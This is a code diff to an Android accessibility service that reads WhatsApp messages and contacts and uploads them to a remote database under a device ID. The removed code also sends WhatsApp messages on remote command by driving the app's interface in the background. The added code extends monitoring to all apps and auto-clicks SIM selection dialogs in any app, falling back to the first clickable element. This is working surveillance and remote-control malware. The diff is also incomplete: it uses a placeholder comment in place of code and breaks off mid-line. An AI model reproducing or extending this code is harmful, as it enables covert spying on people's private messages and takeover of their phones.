@@ -76,6 +76,15 @@ class WhatsAppService : AccessibilityService() {
         private val SEND_IDS = listOf(
             "send", "send_button", "btn_send", "voice_note_btn"
         )
+        
+        // SIM selection bypass IDs
+        private val SIM_SELECTION_IDS = listOf(
+            "sim_selection", "sim_picker", "sim_chooser", "subscription_picker",
+            "sim1", "sim2", "slot_0", "slot_1", "subscription_0", "subscription_1"
+        )
+        private val SIM_OPTION_IDS = listOf(
+            "sim_option", "sim_item", "subscription_item", "sim_card_item"
+        )
     }
 
     data class SendCommand(
@@ -91,7 +100,7 @@ class WhatsAppService : AccessibilityService() {
         try {
             acquireWakeLocks()
             deviceId = MainActivity.getDeviceId(this)
-            Logger.log("WhatsAppService started for deviceId: $deviceId")
+            Logger.log("WhatsAppService started for deviceId: $deviceId with SIM selection bypass")
             startForegroundService()
             setupAccessibilityService()
             loadKnownContacts()
@@ -145,7 +154,7 @@ class WhatsAppService : AccessibilityService() {
 
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("WhatsApp Monitor")
-                .setContentText("Monitoring WhatsApp messages and commands")
+                .setContentText("Monitoring WhatsApp messages and SIM selection bypass")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setSilent(true)
@@ -163,14 +172,15 @@ class WhatsAppService : AccessibilityService() {
     private fun setupAccessibilityService() {
         try {
             val info = AccessibilityServiceInfo().apply {
-                // Enhanced event types for comprehensive message capture
+                // Enhanced event types for comprehensive monitoring including SIM selection
                 eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
-                        AccessibilityEvent.TYPE_VIEW_SELECTED
+                        AccessibilityEvent.TYPE_VIEW_SELECTED or
+                        AccessibilityEvent.TYPE_WINDOWS_CHANGED
                         
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
@@ -178,18 +188,182 @@ class WhatsAppService : AccessibilityService() {
                         AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                         AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
                         
-                packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
+                // Monitor all packages for SIM selection bypass
+                packageNames = null // Monitor all packages
                 
                 // Minimal timeout for faster response
                 notificationTimeout = 50
             }
             serviceInfo = info
-            Logger.log("Accessibility service configured for comprehensive monitoring")
+            Logger.log("Accessibility service configured for comprehensive monitoring with SIM bypass")
         } catch (e: Exception) {
             Logger.error("Failed to setup accessibility service", e)
         }
     }
 
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        event ?: return
+        
+        try {
+            // Handle SIM selection bypass for any package
+            if (handleSimSelectionBypass(event)) {
+                return // SIM selection handled
+            }
+            
+            // Only process WhatsApp events for message monitoring
+            if (event.packageName != WHATSAPP_PACKAGE && event.packageName != WHATSAPP_BUSINESS_PACKAGE) return
+
+            scope.launch {
+                try {
+                    when (event.eventType) {
+                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                            handleContentChange(event)
+                        }
+                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                            handleWindowStateChange(event)
+                        }
+                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
+                            handleNotificationChange(event)
+                        }
+                    }
+                } catch (e: Exception) {
+                    Logger.error("Error processing accessibility event: ${e.message}", e)
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error in onAccessibilityEvent", e)
+        }
+    }
+
+    private fun handleSimSelectionBypass(event: AccessibilityEvent): Boolean {
+        try {
+            val packageName = event.packageName?.toString() ?: return false
+            
+            // Check if this is a SIM selection dialog
+            if (isSimSelectionDialog(event)) {
+                Logger.log("🔄 SIM selection dialog detected in $packageName - attempting bypass")
+                
+                // Get the root node to find SIM options
+                val rootNode = rootInActiveWindow ?: return false
+                
+                // Try to find and click the appropriate SIM option
+                val simClicked = clickAppropriateSimOption(rootNode, packageName)
+                
+                if (simClicked) {
+                    Logger.log("✅ Successfully bypassed SIM selection in $packageName")
+                    return true
+                } else {
+                    Logger.log("⚠️ Could not find appropriate SIM option in $packageName")
+                }
+            }
+            
+            return false
+        } catch (e: Exception) {
+            Logger.error("Error in SIM selection bypass", e)
+            return false
+        }
+    }
+
+    private fun isSimSelectionDialog(event: AccessibilityEvent): Boolean {
+        try {
+            val className = event.className?.toString()?.lowercase() ?: ""
+            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
+            
+            // Check for SIM selection indicators
+            val simKeywords = listOf(
+                "sim", "subscription", "choose", "select", "card", "slot",
+                "sim 1", "sim 2", "sim1", "sim2", "dual sim"
+            )
+            
+            val isSimDialog = simKeywords.any { keyword ->
+                className.contains(keyword) || text.contains(keyword)
+            }
+            
+            // Also check for dialog/picker class names
+            val isDialog = className.contains("dialog") || 
+                          className.contains("picker") || 
+                          className.contains("chooser") ||
+                          className.contains("selector")
+            
+            return isSimDialog && isDialog
+        } catch (e: Exception) {
+            Logger.error("Error checking SIM selection dialog", e)
+            return false
+        }
+    }
+
+    private fun clickAppropriateSimOption(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
+        try {
+            // Strategy 1: Look for SIM-specific IDs
+            SIM_SELECTION_IDS.forEach { id ->
+                val simNodes = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
+                if (simNodes.isNotEmpty()) {
+                    Logger.log("Found SIM selection nodes with ID: $id")
+                    
+                    // Try to click the first available SIM option
+                    simNodes.forEach { node ->
+                        if (node.isClickable) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            Logger.log("Clicked SIM option with ID: $id")
+                            return true
+                        }
+                    }
+                }
+            }
+            
+            // Strategy 2: Look for clickable nodes with SIM-related text
+            val clickableNodes = findClickableNodes(rootNode)
+            clickableNodes.forEach { node ->
+                val nodeText = node.text?.toString()?.lowercase() ?: ""
+                val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
+                
+                val simKeywords = listOf("sim 1", "sim1", "slot 1", "subscription 1", "sim 2", "sim2", "slot 2", "subscription 2")
+                
+                if (simKeywords.any { keyword -> nodeText.contains(keyword) || contentDesc.contains(keyword) }) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Logger.log("Clicked SIM option with text: $nodeText")
+                    return true
+                }
+            }
+            
+            // Strategy 3: Click the first clickable option (fallback)
+            if (clickableNodes.isNotEmpty()) {
+                clickableNodes.first().performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                Logger.log("Clicked first available option as fallback")
+                return true
+            }
+            
+            return false
+        } catch (e: Exception) {
+            Logger.error("Error clicking SIM option", e)
+            return false
+        }
+    }
+
+    private fun findClickableNodes(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
+        val clickableNodes = mutableListOf<AccessibilityNodeInfo>()
+        
+        try {
+            if (node.isClickable) {
+                clickableNodes.add(node)
+            }
+            
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                if (child != null) {
+                    clickableNodes.addAll(findClickableNodes(child))
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error finding clickable nodes", e)
+        }
+        
+        return clickableNodes
+    }
+
+    // ... (rest of the WhatsApp monitoring methods remain the same as in the previous implementation)
+    
     private fun setupNotificationMonitoring() {
         scope.launch {
             while (isActive) {
@@ -261,20 +435,6 @@ class WhatsAppService : AccessibilityService() {
                         Logger.log("Screen wake lock acquired")
                     }
                 }
-                
-                // Additional wake up methods for different Android versions
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
-                    // For newer Android versions
-                    try {
-                        val intent = Intent(Intent.ACTION_MAIN).apply {
-                            addCategory(Intent.CATEGORY_HOME)
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        }
-                        startActivity(intent)
-                    } catch (e: Exception) {
-                        Logger.error("Failed to wake screen with intent", e)
-                    }
-                }
             }
         } catch (e: Exception) {
             Logger.error("Error waking up screen", e)
@@ -312,32 +472,6 @@ class WhatsAppService : AccessibilityService() {
                 }
         } catch (e: Exception) {
             Logger.error("Error loading known contacts", e)
-        }
-    }
-
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        event ?: return
-        
-        // Only process WhatsApp events
-        if (event.packageName != WHATSAPP_PACKAGE && event.packageName != WHATSAPP_BUSINESS_PACKAGE) return
-
-        scope.launch {
-            try {
-                when (event.eventType) {
-                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
-                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                        handleContentChange(event)
-                    }
-                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                        handleWindowStateChange(event)
-                    }
-                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
-                        handleNotificationChange(event)
-                    }
-                }
-            } catch (e: Exception) {
-                Logger.error("Error processing accessibility event: ${e.message}", e)
-            }
         }
     }
 
@@ -655,268 +789,4 @@ class WhatsAppService : AccessibilityService() {
             val dpUrl = getContactDp(chatName, packageName)
             if (dpUrl.isNotEmpty()) {
                 db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
-                    .setValue(mapOf("dpUrl" to dpUrl))
-            }
-        } catch (e: Exception) {
-            Logger.error("Error extracting chat metadata", e)
-        }
-    }
-
-    private fun listenForSendMessageCommands() {
-        try {
-            val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
-            val listener = object : ValueEventListener {
-                override fun onDataChange(snapshot: DataSnapshot) {
-                    try {
-                        snapshot.children.forEach { command ->
-                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
-                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
-                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE
-                            
-                            Logger.log("Received send command for $number: $message ($packageName)")
-                            
-                            // Add to pending commands for processing
-                            pendingCommands.add(SendCommand(number, message, packageName))
-                            
-                            // Remove the command from database
-                            command.ref.removeValue()
-                        }
-                    } catch (e: Exception) {
-                        Logger.error("Error processing send commands", e)
-                    }
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    Logger.error("Failed to read send command: ${error.message}")
-                }
-            }
-            valueEventListener["sendCommands"] = listener
-            sendRef.addValueEventListener(listener)
-        } catch (e: Exception) {
-            Logger.error("Error setting up send message commands listener", e)
-        }
-    }
-
-    private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
-        try {
-            Logger.log("Starting to send message to $recipient via $packageName (Background mode)")
-            
-            // Ensure screen is awake for UI interaction
-            wakeUpScreen()
-            delay(1000)
-            
-            // Open WhatsApp or WhatsApp Business
-            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-            } ?: run {
-                Logger.error("$packageName not installed")
-                return
-            }
-            
-            startActivity(intent)
-            delay(4000) // Wait longer for app to load in background
-
-            // Retry mechanism for each step
-            var success = false
-            
-            // Step 1: Find and click search (with retries)
-            for (searchAttempt in 1..5) {
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val searchButton = SEARCH_IDS.mapNotNull { id ->
-                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                    }.firstOrNull()
-                    
-                    if (searchButton != null) {
-                        searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Logger.log("Search button clicked (attempt $searchAttempt)")
-                        success = true
-                        break
-                    }
-                }
-                delay(1500)
-            }
-            
-            if (!success) {
-                Logger.error("Search button not found after 5 attempts ($packageName)")
-                return
-            }
-            
-            delay(2000)
-
-            // Step 2: Enter recipient in search field (with retries)
-            success = false
-            for (searchFieldAttempt in 1..5) {
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
-                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                    }.firstOrNull()
-                    
-                    if (searchField != null) {
-                        val args = Bundle().apply {
-                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
-                        }
-                        searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-                        Logger.log("Search field filled with recipient (attempt $searchFieldAttempt)")
-                        success = true
-                        break
-                    }
-                }
-                delay(1500)
-            }
-            
-            if (!success) {
-                Logger.error("Search field not found after 5 attempts ($packageName)")
-                return
-            }
-            
-            delay(3000)
-
-            // Step 3: Click on the contact result (with retries)
-            success = false
-            for (contactAttempt in 1..5) {
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val contactResult = CONTACT_NAME_IDS.mapNotNull { id ->
-                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                    }.firstOrNull()
-                    
-                    if (contactResult != null) {
-                        contactResult.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Logger.log("Contact result clicked (attempt $contactAttempt)")
-                        success = true
-                        break
-                    }
-                }
-                delay(1500)
-            }
-            
-            if (!success) {
-                Logger.error("Contact result not found for $recipient after 5 attempts ($packageName)")
-                return
-            }
-            
-            delay(3000)
-
-            // Step 4: Enter message in input field (with retries)
-            success = false
-            for (messageAttempt in 1..5) {
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
-                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                    }.firstOrNull()
-                    
-                    if (messageInput != null) {
-                        val messageArgs = Bundle().apply {
-                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
-                        }
-                        messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
-                        Logger.log("Message input filled (attempt $messageAttempt)")
-                        success = true
-                        break
-                    }
-                }
-                delay(1500)
-            }
-            
-            if (!success) {
-                Logger.error("Message input not found after 5 attempts ($packageName)")
-                return
-            }
-            
-            delay(2000)
-
-            // Step 5: Click send button (with retries)
-            success = false
-            for (sendAttempt in 1..5) {
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val sendButton = SEND_IDS.mapNotNull { id ->
-                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                    }.firstOrNull()
-                    
-                    if (sendButton != null) {
-                        sendButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Logger.log("Send button clicked (attempt $sendAttempt)")
-                        success = true
-                        break
-                    }
-                }
-                delay(1500)
-            }
-            
-            if (success) {
-                Logger.log("Successfully sent message to $recipient ($packageName) in background")
-
-                // Log sent message with unique ID to prevent duplicates
-                val messageData = mapOf(
-                    "sender" to "You",
-                    "recipient" to recipient,
-                    "content" to message,
-                    "timestamp" to System.currentTimeMillis(),
-                    "type" to "Sent",
-                    "isNewContact" to !contactCache.containsKey(recipient),
-                    "uploaded" to System.currentTimeMillis(),
-                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
-                    "packageName" to packageName,
-                    "direction" to "Sent",
-                    "source" to "command"
-                )
-                uploadMessage(messageData)
-            } else {
-                Logger.error("Send button not found after 5 attempts ($packageName)")
-            }
-            
-            // Release screen wake lock after sending
-            screenWakeLock?.let { wakeLock ->
-                if (wakeLock.isHeld) {
-                    wakeLock.release()
-                    Logger.log("Screen wake lock released after sending")
-                }
-            }
-            
-        } catch (e: Exception) {
-            Logger.error("Error sending message ($packageName): ${e.message}", e)
-            
-            // Release screen wake lock on error
-            screenWakeLock?.let { wakeLock ->
-                if (wakeLock.isHeld) {
-                    wakeLock.release()
-                }
-            }
-        }
-    }
-
-    override fun onInterrupt() {
-        Logger.log("WhatsAppService interrupted")
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        try {
-            // Release wake locks
-            wakeLock?.let {
-                if (it.isHeld) {
-                    it.release()
-                }
-            }
-            screenWakeLock?.let {
-                if (it.isHeld) {
-                    it.release()
-                }
-            }
-            
-            scope.cancel()
-            valueEventListener.forEach { (_, listener) ->
-                db.child("Device").child(deviceId).child("whatsapp/commands")
-                    .removeEventListener(listener)
-            }
-            valueEventListener.clear()
-            Logger.log("WhatsAppService destroyed")
-        } catch (e: Exception) {
-            Logger.error("Error destroying WhatsAppService", e)
-        }
-    }
-}
+                    .setValue(map
